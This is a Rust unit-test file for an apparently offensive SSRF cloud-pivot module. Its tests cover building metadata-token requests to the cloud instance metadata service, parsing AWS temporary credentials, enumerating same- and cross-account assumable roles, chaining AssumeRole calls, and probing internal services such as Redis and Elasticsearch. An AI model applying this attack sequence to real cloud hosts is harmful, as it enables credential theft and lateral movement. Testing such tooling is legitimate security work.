use super::ssrf_cloud_pivot::*;

// =========================================================================
// IMDSv2 bypass sequence
// =========================================================================

#[test]
fn imdsv2_bypass_generates_two_requests() {
    let seq = generate_imdsv2_bypass("/latest/meta-data/iam/security-credentials/", 21600);
    assert_eq!(seq.len(), 2);
}

#[test]
fn imdsv2_first_request_is_put_with_ttl() {
    let seq = generate_imdsv2_bypass("/latest/meta-data/hostname", 300);
    let put = &seq[0];
    assert_eq!(put.method, HttpMethod::Put);
    assert!(put.url.contains("/latest/api/token"));
    assert_eq!(
        put.headers
            .get("X-aws-ec2-metadata-token-ttl-seconds")
            .unwrap(),
        "300"
    );
}

#[test]
fn imdsv2_second_request_carries_token_placeholder() {
    let seq = generate_imdsv2_bypass("/latest/meta-data/local-ipv4", 60);
    let get = &seq[1];
    assert_eq!(get.method, HttpMethod::Get);
    assert!(get.url.ends_with("/latest/meta-data/local-ipv4"));
    assert!(get.headers.contains_key("X-aws-ec2-metadata-token"));
}

// =========================================================================
// AWS credential parsing — standard metadata response shape
// =========================================================================

#[test]
fn parse_aws_credentials_metadata_shape() {
    let json = r#"{
        "AccessKeyId": "ASIAAAAAAAAAAAAA",
        "SecretAccessKey": "secretsecretsecretsecret",
        "Token": "FwoGZXIvY...",
        "Expiration": "2025-01-01T00:00:00Z"
    }"#;
    let creds = parse_aws_credentials(json).unwrap();
    assert_eq!(creds.access_key_id, "ASIAAAAAAAAAAAAA");
    assert_eq!(creds.secret_access_key, "secretsecretsecretsecret");
    assert_eq!(creds.session_token, "FwoGZXIvY...");
    assert_eq!(creds.expiration.as_deref(), Some("2025-01-01T00:00:00Z"));
    assert!(creds.assumed_role_arn.is_none());
}

// =========================================================================
// AWS credential parsing — STS AssumeRole response (nested Credentials)
// =========================================================================

#[test]
fn parse_aws_credentials_sts_shape() {
    let json = r#"{
        "Credentials": {
            "AccessKeyId": "ASIABBBBBBBBBBBB",
            "SecretAccessKey": "anothersecret",
            "SessionToken": "sessiontok",
            "Expiration": "2025-06-01T12:00:00Z"
        },
        "AssumedRoleUser": {
            "Arn": "arn:aws:sts::111111111111:assumed-role/Admin/session"
        }
    }"#;
    let creds = parse_aws_credentials(json).unwrap();
    assert_eq!(creds.access_key_id, "ASIABBBBBBBBBBBB");
    assert_eq!(creds.session_token, "sessiontok");
    assert_eq!(
        creds.assumed_role_arn.as_deref(),
        Some("arn:aws:sts::111111111111:assumed-role/Admin/session")
    );
}

#[test]
fn parse_aws_credentials_returns_none_for_garbage() {
    assert!(parse_aws_credentials("not json").is_none());
}

#[test]
fn parse_aws_credentials_returns_none_for_missing_fields() {
    let json = r#"{"AccessKeyId": "ASIA..."}"#;
    assert!(parse_aws_credentials(json).is_none());
}

// =========================================================================
// Assumable role enumeration
// =========================================================================

#[test]
fn enumerate_roles_same_account() {
    let arns = &["arn:aws:iam::123456789012:role/ReadOnly"];
    let roles = enumerate_assumable_roles(arns, "123456789012");
    assert_eq!(roles.len(), 1);
    assert!(!roles[0].is_cross_account);
    assert_eq!(roles[0].role_name, "ReadOnly");
    assert_eq!(roles[0].account_id, "123456789012");
}

#[test]
fn enumerate_roles_cross_account() {
    let arns = &[
        "arn:aws:iam::111111111111:role/Deploy",
        "arn:aws:iam::222222222222:role/Audit",
    ];
    let roles = enumerate_assumable_roles(arns, "111111111111");
    assert_eq!(roles.len(), 2);
    assert!(!roles[0].is_cross_account);
    assert!(roles[1].is_cross_account);
}

#[test]
fn enumerate_roles_skips_malformed_arn() {
    let arns = &["not-an-arn", "arn:aws:iam::999999999999:role/Good"];
    let roles = enumerate_assumable_roles(arns, "999999999999");
    assert_eq!(roles.len(), 1);
    assert_eq!(roles[0].role_name, "Good");
}

// =========================================================================
// Credential chain resolution
// =========================================================================

#[test]
fn credential_chain_contains_caller_identity_url() {
    let creds = make_test_creds();
    let result = resolve_credential_chain(creds, &[], "123456789012");
    assert!(result.caller_identity_url.contains("GetCallerIdentity"));
}

#[test]
fn credential_chain_builds_assume_role_requests() {
    let creds = make_test_creds();
    let arns = &["arn:aws:iam::123456789012:role/Admin"];
    let result = resolve_credential_chain(creds, arns, "123456789012");
    assert_eq!(result.assume_role_requests.len(), 1);
    assert!(result.assume_role_requests[0].url.contains("AssumeRole"));
    assert!(result.assume_role_requests[0]
        .headers
        .contains_key("X-Amz-Security-Token"));
}

#[test]
fn credential_chain_cross_account_flagged_in_description() {
    let creds = make_test_creds();
    let arns = &["arn:aws:iam::999999999999:role/Pivot"];
    let result = resolve_credential_chain(creds, arns, "123456789012");
    assert!(result.assume_role_requests[0]
        .description
        .contains("CROSS-ACCOUNT"));
}

// =========================================================================
// Internal service probing
// =========================================================================

#[test]
fn internal_service_probes_returns_at_least_10() {
    let services = internal_service_probes("10.0.0.1");
    assert!(services.len() >= 10, "got {} services", services.len());
}

#[test]
fn internal_service_probes_contain_common_ports() {
    let services = internal_service_probes("localhost");
    let ports: Vec<u16> = services.iter().map(|s| s.port).collect();
    assert!(ports.contains(&6379), "missing Redis 6379");
    assert!(ports.contains(&9200), "missing Elasticsearch 9200");
    assert!(ports.contains(&5432), "missing PostgreSQL 5432");
}

#[test]
fn internal_service_probe_urls_use_target_host() {
    let services = internal_service_probes("172.16.0.50");
    for svc in &services {
        assert!(
            svc.probe_url.contains("172.16.0.50"),
            "URL missing target host: {}",
            svc.probe_url
        );
    }
}

#[test]
fn internal_service_probe_requests_returns_fingerprint_paths() {
    let probes = internal_service_probe_requests("10.0.0.5");
    assert!(probes.len() >= 10);
    let es = probes
        .iter()
        .find(|p| p.description.contains("Elasticsearch"))
        .unwrap();
    assert!(es.url.contains(":9200/"));
}

// =========================================================================
// Multi-cloud metadata paths
// =========================================================================

#[test]
fn all_cloud_metadata_covers_three_providers() {
    let paths = all_cloud_metadata_paths();
    let providers: std::collections::HashSet<CloudProvider> =
        paths.iter().map(|p| p.provider).collect();
    assert!(providers.contains(&CloudProvider::Aws));
    assert!(providers.contains(&CloudProvider::Gcp));
    assert!(providers.contains(&CloudProvider::Azure));
}

#[test]
fn aws_metadata_paths_contain_iam_credentials() {
    let paths = cloud_metadata_paths_for(CloudProvider::Aws);
    assert!(paths
        .iter()
        .any(|p| p.path.contains("iam/security-credentials")));
}

#[test]
fn gcp_metadata_paths_contain_token_endpoint() {
    let paths = cloud_metadata_paths_for(CloudProvider::Gcp);
    assert!(paths.iter().any(|p| p.path.contains("/token")));
}

#[test]
fn azure_metadata_paths_contain_api_version() {
    let paths = cloud_metadata_paths_for(CloudProvider::Azure);
    for path in &paths {
        assert!(
            path.path.contains("api-version="),
            "Azure path missing api-version: {}",
            path.path
        );
    }
}

#[test]
fn azure_metadata_paths_resolve_version_placeholder() {
    let paths = cloud_metadata_paths_for(CloudProvider::Azure);
    for path in &paths {
        assert!(
            !path.path.contains("{VERSION}"),
            "Unresolved placeholder in: {}",
            path.path
        );
    }
}

// =========================================================================
// IMDSv1 probes
// =========================================================================

#[test]
fn aws_imdsv1_probes_all_get_method() {
    let probes = aws_imdsv1_probes();
    for p in &probes {
        assert_eq!(p.method, HttpMethod::Get);
    }
}

#[test]
fn aws_imdsv1_probes_target_link_local() {
    let probes = aws_imdsv1_probes();
    for p in &probes {
        assert!(
            p.url.starts_with("http://169.254.169.254"),
            "unexpected URL: {}",
            p.url
        );
    }
}

// =========================================================================
// GCP probes require Metadata-Flavor header
// =========================================================================

#[test]
fn gcp_probes_include_flavor_header() {
    let probes = gcp_metadata_probes();
    for p in &probes {
        assert_eq!(p.headers.get("Metadata-Flavor").unwrap(), "Google");
    }
}

#[test]
fn gcp_probes_target_metadata_internal() {
    let probes = gcp_metadata_probes();
    for p in &probes {
        assert!(
            p.url.starts_with("http://metadata.google.internal"),
            "url: {}",
            p.url
        );
    }
}

// =========================================================================
// Azure probes require Metadata: true header
// =========================================================================

#[test]
fn azure_probes_include_metadata_header() {
    let probes = azure_metadata_probes();
    for p in &probes {
        assert_eq!(p.headers.get("Metadata").unwrap(), "true");
    }
}

// =========================================================================
// Full orchestration: analyze_cloud_pivot
// =========================================================================

#[test]
fn analyze_cloud_pivot_without_creds() {
    let result = analyze_cloud_pivot(None, &[], "", "10.0.0.1");
    assert!(result.credential_chain.is_none());
    assert!(!result.metadata_requests.is_empty());
    assert!(result.internal_services.len() >= 10);
    assert!(!result.multi_cloud_paths.is_empty());
}

#[test]
fn analyze_cloud_pivot_with_valid_creds() {
    let json = r#"{
        "AccessKeyId": "ASIAXXXXXXXX",
        "SecretAccessKey": "secret",
        "Token": "tok"
    }"#;
    let arns = &["arn:aws:iam::123456789012:role/Admin"];
    let result = analyze_cloud_pivot(Some(json), arns, "123456789012", "10.0.0.1");
    let chain = result.credential_chain.unwrap();
    assert_eq!(chain.source_credentials.access_key_id, "ASIAXXXXXXXX");
    assert_eq!(chain.assumable_roles.len(), 1);
}

#[test]
fn analyze_cloud_pivot_with_bad_creds_json() {
    let result = analyze_cloud_pivot(Some("garbage"), &[], "", "10.0.0.1");
    assert!(result.credential_chain.is_none());
}

// =========================================================================
// Display impls
// =========================================================================

#[test]
fn cloud_provider_display() {
    assert_eq!(format!("{}", CloudProvider::Aws), "AWS");
    assert_eq!(format!("{}", CloudProvider::Gcp), "GCP");
    assert_eq!(format!("{}", CloudProvider::Azure), "Azure");
}

#[test]
fn http_method_display() {
    assert_eq!(format!("{}", HttpMethod::Get), "GET");
    assert_eq!(format!("{}", HttpMethod::Put), "PUT");
    assert_eq!(format!("{}", HttpMethod::Post), "POST");
}

// =========================================================================
// Helper
// =========================================================================

fn make_test_creds() -> AwsTempCredentials {
    AwsTempCredentials {
        access_key_id: "ASIATEST".to_string(),
        secret_access_key: "secret".to_string(),
        session_token: "token123".to_string(),
        expiration: None,
        assumed_role_arn: None,
    }
}
